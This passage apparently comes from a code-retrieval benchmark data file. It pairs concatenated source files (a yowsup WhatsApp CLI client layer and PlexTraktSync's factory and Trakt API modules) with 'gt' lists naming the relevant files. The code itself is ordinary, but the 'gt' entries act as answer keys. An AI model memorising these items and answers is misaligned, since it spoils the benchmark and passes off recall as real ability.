SubjectGroupsIqProtocolEntity(self.aliasToJid(group_jid), subject)\n            self.toLower(entity)\n\n    @clicmd(\"Set group picture\")\n    def group_picture(self, group_jid, path):\n        if self.assertConnected():\n            with PILOptionalModule(failMessage = self.__class__.FAIL_OPT_PILLOW) as imp:\n                Image = imp(\"Image\")\n\n                def onSuccess(resultIqEntity, originalIqEntity):\n                    self.output(\"Group picture updated successfully\")\n\n                def onError(errorIqEntity, originalIqEntity):\n                    logger.error(\"Error updating Group picture\")\n\n\n\n                src = Image.open(path)\n                pictureData = src.resize((640, 640)).tobytes(\"jpeg\", \"RGB\")\n                picturePreview = src.resize((96, 96)).tobytes(\"jpeg\", \"RGB\")\n                iq = SetPictureIqProtocolEntity(self.aliasToJid(group_jid), picturePreview, pictureData)\n                self._sendIq(iq, onSuccess, onError)\n\n\n    @clicmd(\"Get group info\")\n    def group_info(self, group_jid):\n        if self.assertConnected():\n            entity = InfoGroupsIqProtocolEntity(self.aliasToJid(group_jid))\n            self.toLower(entity)\n\n    @clicmd(\"Get shared keys\")\n    def keys_get(self, jids):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')]\n            entity = GetKeysIqProtocolEntity(jids)\n            self.toLower(entity)\n\n    @clicmd(\"Send init seq\")\n    def seq(self):\n        priv = PrivacyListIqProtocolEntity()\n        self.toLower(priv)\n        push = PushIqProtocolEntity()\n        self.toLower(push)\n        props = PropsIqProtocolEntity()\n        self.toLower(props)\n        crypto = CryptoIqProtocolEntity()\n        self.toLower(crypto)\n\n    @clicmd(\"Delete your account\")\n    def account_delete(self):\n        if self.assertConnected():\n            if self.accountDelWarnings < self.__class__.ACCOUNT_DEL_WARNINGS:\n                self.accountDelWarnings += 1\n                remaining = self.__class__.ACCOUNT_DEL_WARNINGS - self.accountDelWarnings\n                self.output(\"Repeat delete command another %s times to send the delete request\" % remaining, tag=\"Account delete Warning !!\", prompt = False)\n            else:\n                entity = UnregisterIqProtocolEntity()\n                self.toLower(entity)\n\n    @clicmd(\"Send message to a friend\")\n    def message_send(self, number, content):\n        if self.assertConnected():\n            outgoingMessage = TextMessageProtocolEntity(content, to=self.aliasToJid(number))\n            self.toLower(outgoingMessage)\n\n    @clicmd(\"Broadcast message. numbers should comma separated phone numbers\")\n    def message_broadcast(self, numbers, content):\n        if self.assertConnected():\n            jids = [self.aliasToJid(number) for number in numbers.split(',')]\n            outgoingMessage = BroadcastTextMessage(jids, content)\n            self.toLower(outgoingMessage)\n\n\n    def message_read(self, message_id):\n        pass\n\n\n    def message_delivered(self, message_id):\n        pass\n\n    @clicmd(\"Send a video with optional caption\")\n    def video_send(self, number, path, caption = None):\n        self.media_send(number, path, RequestUploadIqProtocolEntity.MEDIA_TYPE_VIDEO)\n\n    @clicmd(\"Send an image with optional caption\")\n    def image_send(self, number, path, caption = None):\n        self.media_send(number, path, RequestUploadIqProtocolEntity.MEDIA_TYPE_IMAGE)\n\n    @clicmd(\"Send audio file\")\n    def audio_send(self, number, path):\n        self.media_send(number, path, RequestUploadIqProtocolEntity.MEDIA_TYPE_AUDIO)\n\n    def media_send(self, number, path, mediaType, caption = None):\n        if self.assertConnected():\n            jid = self.aliasToJid(number)\n            entity = RequestUploadIqProtocolEntity(mediaType, filePath=path)\n            successFn = lambda successEntity, originalEntity: self.onRequestUploadResult(jid, mediaType, path, successEntity, originalEntity, caption)\n            errorFn = lambda errorEntity, originalEntity: self.onRequestUploadError(jid, path, errorEntity, originalEntity)\n            self._sendIq(entity, successFn, errorFn)\n\n    @clicmd(\"Send typing state\")\n    def state_typing(self, jid):\n        if self.assertConnected():\n            entity = OutgoingChatstateProtocolEntity(ChatstateProtocolEntity.STATE_TYPING, self.aliasToJid(jid))\n            self.toLower(entity)\n\n    @clicmd(\"Request contacts statuses\")\n    def statuses_get(self, contacts):\n\n        def on_success(entity, original_iq_entity):\n\n            status_outs = []\n            for jid, status_info in entity.statuses.items():\n                status_outs.append(\"[user=%s status=%s last_updated=%s]\" % (jid, status_info[0], status_info[1]))\n            self.output(\"\\n\".join(status_outs), tag=\"statuses_get result\")\n\n        def on_error(entity, original_iq):\n\n            logger.error(\"Failed to get statuses\")\n\n        if self.assertConnected():\n            entity = GetStatusesIqProtocolEntity([self.aliasToJid(c) for c in contacts.split(',')])\n            self._sendIq(entity, on_success, on_error)\n\n    @clicmd(\"Send paused state\")\n    def state_paused(self, jid):\n        if self.assertConnected():\n            entity = OutgoingChatstateProtocolEntity(ChatstateProtocolEntity.STATE_PAUSED, self.aliasToJid(jid))\n            self.toLower(entity)\n\n    @clicmd(\"Sync contacts, contacts should be comma separated phone numbers, with no spaces\")\n    def contacts_sync(self, contacts):\n        if self.assertConnected():\n            entity = GetSyncIqProtocolEntity(contacts.split(','))\n            self.toLower(entity)\n\n    @clicmd(\"Disconnect\")\n    def disconnect(self):\n        if self.assertConnected():\n\n            self.broadcastEvent(YowLayerEvent(YowNetworkLayer.EVENT_STATE_DISCONNECT))\n\n    @clicmd(\"Quick login\")\n    def L(self):\n        if self.connected:\n            return self.output(\"Already connected, disconnect first\")\n        threading.Thread(target=lambda: self.getLayerInterface(YowNetworkLayer).connect()).start()\n        return True\n\n\n\n    @ProtocolEntityCallback(\"presence\")\n    def onPresenceChange(self, entity):\n        status=\"offline\"\n        if entity.getType() is None:\n            status=\"online\"\n\n        lastseen = entity.getLast()\n        if status is \"offline\" and lastseen is \"deny\":\n            lastseen = time.time()\n\n        self.output(\"%s %s %s lastseen at: %s\" % (entity.getFrom(), entity.getTag(), status, lastseen))\n\n    @ProtocolEntityCallback(\"chatstate\")\n    def onChatstate(self, entity):\n        print(entity)\n\n    @ProtocolEntityCallback(\"iq\")\n    def onIq(self, entity):\n        if not isinstance(entity, ResultStatusesIqProtocolEntity):\n            print(entity)\n\n    @ProtocolEntityCallback(\"receipt\")\n    def onReceipt(self, entity):\n        self.toLower(entity.ack())\n\n    @ProtocolEntityCallback(\"ack\")\n    def onAck(self, entity):\n\n\n        if entity.getClass() == \"message\":\n            self.output(entity.getId(), tag = \"Sent\")\n\n\n    @ProtocolEntityCallback(\"success\")\n    def onSuccess(self, entity):\n        self.connected = True\n        self.output(\"Logged in!\", \"Auth\", prompt = False)\n        self.notifyInputThread()\n\n    @ProtocolEntityCallback(\"failure\")\n    def onFailure(self, entity):\n        self.connected = False\n        self.output(\"Login Failed, reason: %s\" % entity.getReason(), prompt = False)\n\n    @ProtocolEntityCallback(\"notification\")\n    def onNotification(self, notification):\n        notificationData = notification.__str__()\n        if notificationData:\n            self.output(notificationData, tag = \"Notification\")\n        else:\n            self.output(\"From :%s, Type: %s\" % (self.jidToAlias(notification.getFrom()), notification.getType()), tag = \"Notification\")\n\n    @ProtocolEntityCallback(\"message\")\n    def onMessage(self, message):\n        messageOut = \"\"\n        if message.getType() == \"text\":\n\n            messageOut = self.getTextMessageBody(message)\n        elif message.getType() == \"media\":\n            messageOut = self.getMediaMessageBody(message)\n        else:\n            messageOut = \"Unknown message type %s \" % message.getType()\n            print(messageOut.toProtocolTreeNode())\n\n        formattedDate = datetime.datetime.fromtimestamp(message.getTimestamp()).strftime('%d-%m-%Y %H:%M')\n        sender = message.getFrom() if not message.isGroupMessage() else \"%s/%s\" % (message.getParticipant(False), message.getFrom())\n\n        output = self.__class__.MESSAGE_FORMAT % (sender, formattedDate, message.getId(), messageOut)\n\n        self.output(output, tag = None, prompt = not self.sendReceipts)\n        if self.sendReceipts:\n            self.toLower(message.ack(self.sendRead))\n            self.output(\"Sent delivered receipt\"+\" and Read\" if self.sendRead else \"\", tag = \"Message %s\" % message.getId())\n\n    def getTextMessageBody(self, message):\n        if isinstance(message, TextMessageProtocolEntity):\n            return message.conversation\n        elif isinstance(message, ExtendedTextMessageProtocolEntity):\n            return str(message.message_attributes.extended_text)\n        else:\n            raise NotImplementedError()\n\n    def getMediaMessageBody(self, message):\n\n        return str(message.message_attributes)\n\n    def getDownloadableMediaMessageBody(self, message):\n        return \"[media_type={media_type}, length={media_size}, url={media_url}, key={media_key}]\".format(\n            media_type=message.media_type,\n            media_size=message.file_length,\n            media_url=message.url,\n            media_key=base64.b64encode(message.media_key)\n        )\n\n    def doSendMedia(self, mediaType, filePath, url, to, ip = None, caption = None):\n        if mediaType == RequestUploadIqProtocolEntity.MEDIA_TYPE_IMAGE:\n        \tentity = ImageDownloadableMediaMessageProtocolEntity.fromFilePath(filePath, url, ip, to, caption = caption)\n        elif mediaType == RequestUploadIqProtocolEntity.MEDIA_TYPE_AUDIO:\n        \tentity = AudioDownloadableMediaMessageProtocolEntity.fromFilePath(filePath, url, ip, to)\n        elif mediaType == RequestUploadIqProtocolEntity.MEDIA_TYPE_VIDEO:\n        \tentity = VideoDownloadableMediaMessageProtocolEntity.fromFilePath(filePath, url, ip, to, caption = caption)\n        self.toLower(entity)\n\n    def __str__(self):\n        return \"CLI Interface Layer\"\n\n\n\n    def onRequestUploadResult(self, jid, mediaType, filePath, resultRequestUploadIqProtocolEntity, requestUploadIqProtocolEntity, caption = None):\n\n        if resultRequestUploadIqProtocolEntity.isDuplicate():\n            self.doSendMedia(mediaType, filePath, resultRequestUploadIqProtocolEntity.getUrl(), jid,\n                             resultRequestUploadIqProtocolEntity.getIp(), caption)\n        else:\n            successFn = lambda filePath, jid, url: self.doSendMedia(mediaType, filePath, url, jid, resultRequestUploadIqProtocolEntity.getIp(), caption)\n            mediaUploader = MediaUploader(jid, self.getOwnJid(), filePath,\n                                      resultRequestUploadIqProtocolEntity.getUrl(),\n                                      resultRequestUploadIqProtocolEntity.getResumeOffset(),\n                                      successFn, self.onUploadError, self.onUploadProgress, asynchronous=False)\n            mediaUploader.start()\n\n    def onRequestUploadError(self, jid, path, errorRequestUploadIqProtocolEntity, requestUploadIqProtocolEntity):\n        logger.error(\"Request upload for file %s for %s failed\" % (path, jid))\n\n    def onUploadError(self, filePath, jid, url):\n        logger.error(\"Upload file %s to %s for %s failed!\" % (filePath, url, jid))\n\n    def onUploadProgress(self, filePath, jid, url, progress):\n        sys.stdout.write(\"%s => %s, %d%% \\r\" % (os.path.basename(filePath), jid, progress))\n        sys.stdout.flush()\n\n    def onGetContactPictureResult(self, resultGetPictureIqProtocolEntiy, getPictureIqProtocolEntity):\n\n\n\n\n\n\n        pass\n\n    @clicmd(\"Print this message\")\n    def help(self):\n        self.print_usage()\n\n'yowsup/yowsup/demos/cli/stack.py'\n:from yowsup.stacks import  YowStackBuilder\nfrom .layer import YowsupCliLayer\nfrom yowsup.layers import YowLayerEvent\nfrom yowsup.layers.axolotl.props import PROP_IDENTITY_AUTOTRUST\nimport sys\n\n\nclass YowsupCliStack(object):\n    def __init__(self, profile):\n        stackBuilder = YowStackBuilder()\n\n        self._stack = stackBuilder\\\n            .pushDefaultLayers()\\\n            .push(YowsupCliLayer)\\\n            .build()\n\n        self._stack.setProfile(profile)\n        self._stack.setProp(PROP_IDENTITY_AUTOTRUST, True)\n\n    def set_prop(self, prop, val):\n        self._stack.setProp(prop, val)\n\n    def start(self):\n        print(\"Yowsup Cli client\\n==================\\nType /help for available commands\\n\")\n        self._stack.broadcastEvent(YowLayerEvent(YowsupCliLayer.EVENT_START))\n\n        try:\n            self._stack.loop()\n        except KeyboardInterrupt:\n            print(\"\\nYowsdown\")\n            sys.exit(0)\n\n'yowsup/yowsup/layers/protocol_contacts/protocolentities/__init__.py'\n:from .iq_sync import SyncIqProtocolEntity\nfrom .iq_sync_get import GetSyncIqProtocolEntity\nfrom .iq_sync_result import ResultSyncIqProtocolEntity\nfrom .notification_contact_add import AddContactNotificationProtocolEntity\nfrom .notification_contact_remove import RemoveContactNotificationProtocolEntity\nfrom .notification_contact_update import UpdateContactNotificationProtocolEntity\nfrom .notificiation_contacts_sync import ContactsSyncNotificationProtocolEntity\n",
        "gt": [
            "'yowsup/yowsup/layers/protocol_contacts/protocolentities/__init__.py'",
            "'yowsup/yowsup/demos/cli/layer.py'",
            "'yowsup/yowsup/demos/cli/stack.py'",
            "'yowsup/yowsup/demos/cli/__init__.py'"
        ]
    },
    {
        "files": [
            "'PlexTraktSync/plextraktsync/util/Factory.py'",
            "'PlexTraktSync/plextraktsync/trakt/TraktApi.py'",
            "'PlexTraktSync/plextraktsync/factory.py'",
            "'PlexTraktSync/plextraktsync/plan/Walker.py'",
            "'PlexTraktSync/plextraktsync/trakt/WatchProgress.py'",
            "'PlexTraktSync/plextraktsync/commands/info.py'"
        ],
        "content": "'PlexTraktSync/plextraktsync/util/Factory.py'\n:from __future__ import annotations\n\nfrom functools import cached_property\n\n\nclass Factory:\n    def invalidate(self, keys: list[str] = None):\n\n        for key in keys or []:\n            try:\n                del self.__dict__[key]\n            except KeyError:\n                pass\n\n    @cached_property\n    def version(self):\n        from plextraktsync.util.Version import Version\n\n        return Version()\n\n    @cached_property\n    def console(self):\n        from rich.console import Console\n\n        from plextraktsync.rich.RichHighlighter import RichHighlighter\n\n        return Console(highlighter=RichHighlighter())\n\n    @cached_property\n    def print(self):\n        return self.console.print\n\n    @cached_property\n    def trakt_api(self):\n        from plextraktsync.trakt.TraktApi import TraktApi\n\n        return TraktApi()\n\n    @cached_property\n    def plex_api(self):\n        from plextraktsync.plex.PlexApi import PlexApi\n\n        return PlexApi(\n            server=self.plex_server,\n            config=self.server_config,\n        )\n\n    @cached_property\n    def media_factory(self):\n        from plextraktsync.media.MediaFactory import MediaFactory\n\n        trakt = self.trakt_api\n        plex = self.plex_api\n        mf = MediaFactory(plex, trakt)\n\n        return mf\n\n    def get_plex_by_id(self, server_id: str):\n        server_config = self.server_config_factory.server_by_id(server_id)\n        if server_config is not None and server_config is not self.server_config:\n            self.invalidate([\"plex_api\", \"plex_server\", \"server_config\"])\n            self.run_config.server = server_config.name\n\n        return self.plex_api\n\n    @cached_property\n    def plex_server(self):\n        from plextraktsync.factory import factory\n        from plextraktsync.plex.PlexServerConnection import \\\n            PlexServerConnection\n\n        server = self.server_config\n\n        return PlexServerConnection(factory).connect(\n            urls=server.urls,\n            token=server.token,\n        )\n\n    @cached_property\n    def plex_lists(self):\n        from plextraktsync.plex.PlexPlaylistCollection import \\\n            PlexPlaylistCollection\n\n        return PlexPlaylistCollection(self.plex_server)\n\n    @cached_property\n    def has_plex_token(self):\n        try:\n            return self.server_config.token is not None\n        except RuntimeError:\n            return False\n\n    @cached_property\n    def server_config_factory(self):\n        from plextraktsync.config.ServerConfigFactory import \\\n            ServerConfigFactory\n\n        return ServerConfigFactory()\n\n    @cached_property\n    def server_config(self):\n\n        config = self.config\n        run_config = self.run_config\n        server_config = self.server_config_factory\n        server_name = run_config.server\n\n        if server_name is None:\n\n            server_config.load()\n            server_name = config[\"PLEX_SERVER\"]\n\n        return server_config.get_server(server_name)\n\n    @cached_property\n    def urls_expire_after(self):\n        if not self.run_config.cache:\n            from requests_cache import DO_NOT_CACHE\n\n            return {\n                \"*\": DO_NOT_CACHE,\n            }\n\n        return self.config.http_cache.urls_expire_after\n\n    @cached_property\n    def session(self):\n        from requests_cache import CachedSession\n\n        return CachedSession(\n            cache_name=self.config.cache_path,\n            cache_control=True,\n            urls_expire_after=self.urls_expire_after,\n        )\n\n    @cached_property\n    def sync(self):\n        from plextraktsync.sync.Sync import Sync\n\n        plex = self.plex_api\n        trakt = self.trakt_api\n\n        return Sync(self.sync_config, plex, trakt)\n\n    @cached_property\n    def progressbar(self):\n        if not self.run_config.progressbar:\n            return None\n\n        from functools import partial\n\n        from plextraktsync.rich.RichProgressBar import RichProgressBar\n\n        return partial(RichProgressBar, options={\"console\": self.console})\n\n    @cached_property\n    def run_config(self):\n        from plextraktsync.config.RunConfig import RunConfig\n\n        config = RunConfig()\n\n        return config\n\n    @cached_property\n    def walk_config(self):\n        from plextraktsync.plan.WalkConfig import WalkConfig\n\n        wc = WalkConfig()\n\n        return wc\n\n    @cached_property\n    def plex_audio_codec(self):\n        from plextraktsync.plex.PlexAudioCodec import PlexAudioCodec\n\n        return PlexAudioCodec()\n\n    @cached_property\n    def walker(self):\n        from plextraktsync.plan.Walker import Walker\n\n        walk_config = self.walk_config\n        plex = self.plex_api\n        trakt = self.trakt_api\n        mf = self.media_factory\n        pb = self.progressbar\n        w = Walker(plex=plex, trakt=trakt, mf=mf, config=walk_config, progressbar=pb)\n\n        return w\n\n    @cached_property\n    def enable_self_update(self):\n        from plextraktsync.util.packaging import pipx_installed, program_name\n\n        package = pipx_installed(program_name())\n\n        return package is not None\n\n    @cached_property\n    def web_socket_listener(self):\n        from plextraktsync.watch.WebSocketListener import WebSocketListener\n\n        return WebSocketListener(plex=self.plex_server)\n\n    @cached_property\n    def watch_state_updater(self):\n        from plextraktsync.watch.WatchStateUpdater import WatchStateUpdater\n\n        return WatchStateUpdater(\n            plex=self.plex_api,\n            trakt=self.trakt_api,\n            mf=self.media_factory,\n            config=self.config,\n        )\n\n    @cached_property\n    def logging(self):\n        import logging\n\n        from plextraktsync.logger.init import initialize\n\n        config = self.config\n        initialize(config)\n        logger_filter = self.logger_filter\n\n\n        self.logger_filter_apply(logger_filter)\n\n        class Logging:\n            @staticmethod\n            def getLogger(name):\n\n                logger = logging.getLogger(name)\n                logger.addFilter(logger_filter)\n                return logger\n\n            def __getattr__(self, name):\n\n                return getattr(logging, name)\n\n        return Logging()\n\n    @cached_property\n    def logger(self):\n        return self.logging.getLogger(\"plextraktsync\")\n\n    @cached_property\n    def logger_filter(self):\n        import logging\n\n        from plextraktsync.logger.filter import LoggerFilter\n\n        config = self.config\n        logger = logging.getLogger(\"plextraktsync\")\n\n        return LoggerFilter(config[\"logging\"][\"filter\"], logger)\n\n    def logger_filter_apply(self, logger_filter):\n        import logging\n        config = self.config\n        loggers = config[\"logging\"][\"filter_loggers\"] or []\n\n        for name in loggers:\n            logging.getLogger(name).addFilter(logger_filter)\n\n    @cached_property\n    def console_logger(self):\n        from rich.logging import RichHandler\n\n        from plextraktsync.rich.RichHighlighter import RichHighlighter\n\n        config = self.config\n        handler = RichHandler(\n            console=self.console,\n            show_time=config.log_console_time,\n            log_time_format=\"[%Y-%m-%d %X]\",\n            show_path=False,\n            highlighter=RichHighlighter(),\n            rich_tracebacks=True,\n        )\n\n        return handler\n\n    @cached_property\n    def config(self):\n        from plextraktsync.config.Config import Config\n\n        def invalidate_plex_cache(key, value):\n            self.invalidate([\"has_plex_token\", \"server_config\"])\n\n        config = Config()\n        config.add_listener(invalidate_plex_cache, [\"PLEX_SERVER\"])\n\n        return config\n\n    @property\n    def sync_config(self):\n        from plextraktsync.config.SyncConfig import SyncConfig\n\n        return SyncConfig(self.config, self.server_config)\n\n    @cached_property\n    def queue(self):\n        from plextraktsync.queue.BackgroundTask import BackgroundTask\n        from plextraktsync.queue.Queue import Queue\n        from plextraktsync.queue.TraktBatchWorker import TraktBatchWorker\n        from plextraktsync.queue.TraktMarkWatchedWorker import \\\n            TraktMarkWatchedWorker\n        from plextraktsync.queue.TraktScrobbleWorker import TraktScrobbleWorker\n\n        workers = [\n            TraktBatchWorker(),\n            TraktMarkWatchedWorker(),\n            TraktScrobbleWorker(),\n        ]\n        task = BackgroundTask(self.batch_delay_timer, *workers)\n        queue = Queue(task)\n\n        return queue\n\n    @cached_property\n    def batch_delay_timer(self):\n        from plextraktsync.util.Timer import Timer\n\n        return Timer(self.run_config.batch_delay) if self.run_config.batch_delay else None\n\n'PlexTraktSync/plextraktsync/trakt/TraktApi.py'\n:from __future__ import annotations\n\nimport datetime\nfrom functools import cached_property\nfrom typing import TYPE_CHECKING\n\nimport trakt\nimport trakt.movies\nimport trakt.sync\nimport trakt.users\nfrom click import ClickException\nfrom trakt.errors import (ForbiddenException, OAuthException,\n                          OAuthRefreshException)\n\nfrom plextraktsync import pytrakt_extensions\nfrom plextraktsync.decorators.flatten import flatten_list\nfrom plextraktsync.decorators.rate_limit import rate_limit\nfrom plextraktsync.decorators.retry import retry\nfrom plextraktsync.decorators.time_limit import time_limit\nfrom plextraktsync.factory import factory, logging\nfrom plextraktsync.path import pytrakt_file\nfrom plextraktsync.trakt.PartialTraktMedia import PartialTraktMedia\nfrom plextraktsync.trakt.TraktLookup import TraktLookup\nfrom plextraktsync.trakt.TraktRatingCollection import TraktRatingCollection\nfrom plextraktsync.trakt.WatchProgress import WatchProgress\nfrom plextraktsync.util.Rating import Rating\n\nif TYPE_CHECKING:\n    from trakt.movies import Movie\n    from trakt.tv import TVEpisode, TVShow\n\n    from plextraktsync.plex.PlexGuid import PlexGuid\n    from plextraktsync.plex.PlexLibraryItem import PlexLibraryItem\n    from plextraktsync.trakt.types import TraktLikedList, TraktMedia\n\n\nclass TraktApi:\n\n    logger = logging.getLogger(__name__)\n\n    def __init__(self):\n        trakt.core.CONFIG_PATH = pytrakt_file\n        trakt.core.session = factory.session\n\n    @staticmethod\n    def device_auth(client_id: str, client_secret: str):\n        trakt.core.AUTH_METHOD = trakt.core.DEVICE_AUTH\n\n        return trakt.init(client_id=client_id, client_secret=client_secret, store=True)\n\n    @cached_property\n    @rate_limit()\n    @retry()\n    def me(self):\n        try:\n            return trakt.users.User(\"me\")\n        except OAuthRefreshException as e:\n            self.logger.error(f\"{e.error}: {e.error_description}\")\n            raise ClickException(\"Trakt error: Unable to refresh token\")\n        except (OAuthException, ForbiddenException) as e:\n            raise ClickException(f\"Trakt authentication error: {str(e)}\")\n\n    @cached_property\n    @rate_limit()\n    @retry()\n    @flatten_list\n    def liked_lists(self) -> list[TraktLikedList]:\n        for item in self.me.get_liked_lists(\"lists\", limit=1000):\n\n\n            if item[\"list\"][\"privacy\"] == \"private\":\n                self.logger.warning(f\"Skipping private list: {item['list']['name']} - {item['list']['share_link']}\")\n                continue\n            tll: TraktLikedList = {\n                \"listname\": item[\"list\"][\"name\"],\n                \"listid\": item[\"list\"][\"ids\"][\"trakt\"],\n            }\n            yield tll\n\n    @cached_property\n    @rate_limit()\n    @retry()\n    def watched_movies(self):\n        return set(map(lambda m: m.trakt, self.me.watched_movies))\n\n    @cached_property\n    @rate_limit()\n    @retry()\n    def watch_progress(self):\n        return WatchProgress(trakt.sync.get_playback())\n\n    @cached_property\n    @rate_limit()\n    @retry()\n    def movie_collection(self):\n        return self.me.movie_collection\n\n    @property\n    @rate_limit()\n    @retry()\n    def show_collection(self):\n        return self.me.show_collection\n\n    @cached_property\n    @flatten_list\n    def episodes_collection(self) -> list[TVEpisode]:\n        for show in self.show_collection:\n            for season in show.seasons:\n                yield from season.episodes\n\n    def remove_from_collection(self, m: TraktMedia):\n        if m.media_type not in [\"movies\", \"shows\", \"episodes\"]:\n            raise ValueError(f\"Unsupported media type: {m.media_type}\")\n\n        item = dict(\n            title=m.title,\n            year=m.year,\n            **m.ids,\n        )\n\n        self.queue.remove_from_collection((m.media_type, item))\n\n    @cached_property\n    def movie_collection_set(self):\n        return set(map(lambda m: m.trakt, self.movie_collection))\n\n    @cached_property\n    @rate_limit()\n    @retry()\n    def watched_shows(self):\n        return pytrakt_extensions.allwatched()\n\n    @cached_property\n    @rate_limit()\n    @retry()\n    def collected_shows(self):\n        return pytrakt_extensions.allcollected()\n\n    @property\n    @rate_limit()\n    @retry()\n    def watchlist_movies(self):\n        return self.me.watchlist_movies\n\n    @property\n    @rate_limit()\n    @retry()\n    def watchlist_shows(self):\n        return self.me.watchlist_shows\n\n    @cached_property\n    def ratings(self):\n        return TraktRatingCollection(self)\n\n    def rating(self, m) -> Rating | None:\n        \"\"\"\n        The trakt api (Python module) is inconsistent:\n        - Movie has \"rating\" property, while TVShow does not\n        However, the Movie property is always None.\n        So fetch for all types.\n        \"\"\"\n        if m.media_type not in [\"movies\", \"shows\", \"episodes\"]:\n            raise ValueError(f\"Unsupported type: {m.media_type}\")\n\n        return self.ratings[m.media_type].get(m.trakt, None)\n\n    @rate_limit()\n    @retry()\n    def get_ratings(self, media_type: str):\n        return self.me.get_ratings(media_type)\n\n    @rate_limit()\n    @time_limit()\n    @retry()\n    def rate(self, m: TraktMedia, rating: int, rate_date: datetime.datetime = None):\n        m.rate(rating, rate_date)\n\n    @rate_limit()\n    @time_limit()\n    @retry()\n    def mark_watched(self, m: TraktMedia, time: datetime.datetime, show_trakt_id=None):\n        if m.media_type == \"movies\":\n            self.watched_movies.add(m.trakt)\n        elif m.media_type == \"episodes\" and show_trakt_id:\n            self.watched_shows.add(show_trakt_id, m.season, m.number)\n        else:\n            raise RuntimeError(f\"mark_watched: Unsupported media type: {m.media_type}\")\n\n\n        partial = PartialTraktMedia.create(m, watched_at=time)\n        self.queue.add_to_history(partial)\n\n    def add_to_collection(self, m, pm: PlexLibraryItem):\n        if m.media_type == \"movies\":\n            item = dict(\n                title=m.title,\n                year=m.year,\n                **m.ids,\n                **pm.to_json(),\n            )\n        elif m.media_type == \"episodes\":\n            item = dict(**m.ids, **pm.to_json())\n        else:\n            raise ValueError(f\"Unsupported media type: {m.media_type}\")\n\n        self.queue.add_to_collection((m.media_type, item))\n\n    def add_to_watchlist(self, m):\n        if m.media_type not in [\"movies\", \"shows\"]:\n            raise ValueError(f\"Unsupported media type for watchlist: {m.media_type}\")\n\n        item = dict(\n            title=m.title,\n            year=m.year,\n            **m.ids,\n        )\n\n        self.queue.add_to_watchlist((m.media_type, item))\n\n    def remove_from_watchlist(self, m):\n        if m.media_type not in [\"movies\", \"shows\"]:\n            raise ValueError(f\"Unsupported media type for watchlist: {m.media_type}\")\n\n        item = dict(\n            title=m.title,\n            year=m.year,\n            **m.ids,\n        )\n\n        self.queue.remove_from_watchlist((m.media_type, item))\n\n    def find_by_episode_guid(self, guid: PlexGuid):\n        ts: TVShow = self.search_by_id(guid.show_id, id_type=guid.provider, media_type=\"show\")\n        if not ts:\n            return None\n\n        lookup = TraktLookup(ts)\n        te = self.find_episode_guid(guid, lookup)\n        if not te:\n            return None\n\n\n        te.show = ts\n\n        return te\n\n    def find_by_guid(self, guid: PlexGuid):\n        if guid.type == \"episode\" and guid.is_episode:\n            return self.find_by_episode_guid(guid)\n        else:\n            tm = self.search_by_id(guid.id, id_type=guid.provider, media_type=guid.type)\n            if tm is None and guid.type == \"movie\":\n                if self.search_by_id(guid.id, id_type=guid.provider, media_type=\"show\"):\n                    self.logger.warning(f\"Found match using show search: {guid.title_link}\", extra={\"markup\": True})\n\n            return tm\n\n    @rate_limit()\n    @retry()\n    def search_by_id(self, media_id: str, id_type: str, media_type: str) -> TVShow | Movie | None:\n        if id_type == \"tvdb\" and media_type == \"movie\":\n\n\n\n            self.logger.debug(f\"search_by_id: tvdb does not support movie provider, skip {id_type}/{media_type}/{media_id}\")\n            return None\n        if media_type == \"season\":\n\n\n            self.logger.debug(\"trakt does not support search by season\")\n            return None\n\n        if not self.valid_trakt_id(media_id):\n            self.logger.error(f\"Ignoring invalid id: '{media_id}'\")\n\n            return None\n\n        search = trakt.sync.search_by_id(\n            media_id, id_type=id_type, media_type=media_type\n        )\n        if not search:\n            return None\n\n        if len(search) > 1:\n            self.logger.debug(f\"search_by_id({media_id}, {id_type}, {media_type}) got {len(search)} results, taking first one\")\n            self.logger.debug([pm.to_json() for pm in search])\n\n\n        return search[0]\n\n    @staticmethod\n    def valid_trakt_id(media_id: str):\n\n\n        if media_id[0:2] == \"tt\" and media_id[2:].isnumeric():\n            return True\n\n\n        if not media_id.isnumeric():\n            return False\n\n\n        return len(media_id) < 12\n\n    def find_episode_guid(self, guid: PlexGuid, lookup: TraktLookup):\n\n        te = lookup.from_guid(guid)\n        if te:\n            return te\n\n        self.logger.debug(f\"Retry using search for specific Plex Episode {guid.guid}\")\n        if not guid.is_episode:\n            return self.find_by_guid(guid)\n        return None\n\n    @cached_property\n    def queue(self):\n        return factory.queue\n\n'PlexTraktSync/plextraktsync/factory.py'\n:from plextraktsync.util.Factory import Factory\n\nfactory = Factory()\nlogger = factory.logger\nlogging = factory.logging\n\n'PlexTraktSync/plextraktsync/plan/Walker.py'\n:from __future__ import annotations\n\nfrom functools import cached_property\nfrom typing import TYPE_CHECKING\n\nfrom plextraktsync.decorators.measure_time import measure_time\nfrom plextraktsync.factory import logging\nfrom plextraktsync.mixin.SetWindowTitle import SetWindowTitle\nfrom plextraktsync.plex.PlexGuid import PlexGuid\nfrom plextraktsync.plex.PlexLibraryItem import PlexLibraryItem\nfrom plextraktsync.trakt.TraktApi import TraktApi\nfrom plextraktsync.trakt.TraktItem import TraktItem\n\nif TYPE_CHECKING:\n    from typing import Any, Generator, Iterable\n\n    from plexapi.video import Episode\n\n    from plextraktsync.media.Media import Media\n    from plextraktsync.media.MediaFactory import MediaFactory\n    from plextraktsync.plan.WalkConfig import WalkConfig\n    from plextraktsync.plex.PlexApi import PlexApi\n    from plextraktsync.plex.PlexLibrarySection import PlexLibrarySection\n\n\nclass Walker(SetWindowTitle):\n\n    logger = logging.getLogger(__name__)\n\n    def __init__(\n        self,\n        plex: PlexApi,\n        trakt: TraktApi,\n        mf: MediaFactory,\n        config: WalkConfig,\n        progressbar=None,\n    ):\n        self._progressbar = progressbar\n        self.plex = plex\n        self.trakt = trakt\n        self.mf = mf\n        self.config = config\n\n    @cached_property\n    def plan(self):\n        from plextraktsync.plan.WalkPlanner import WalkPlanner\n\n        return WalkPlanner(self.plex, self.config).plan()\n\n    @property\n    def is_partial(self):\n        return self.config.is_partial\n\n    def print_plan(self, print):\n        if self.plan.movie_sections:\n            print(f\"Sync Movie sections: {[x.title_link for x in self.plan.movie_sections]}\", extra={\"markup\": True})\n\n        if self.plan.show_sections:\n            print(f\"Sync Show sections: {[x.title_link for x in self.plan.show_sections]}\", extra={\"markup\": True})\n\n        if self.plan.movies:\n            print(f\"Sync Movies: {[x.title for x in self.plan.movies]}\")\n\n        if self.plan.shows:\n            print(f\"Sync Shows: {[x.title for x in self.plan.shows]}\")\n\n        if self.plan.episodes:\n            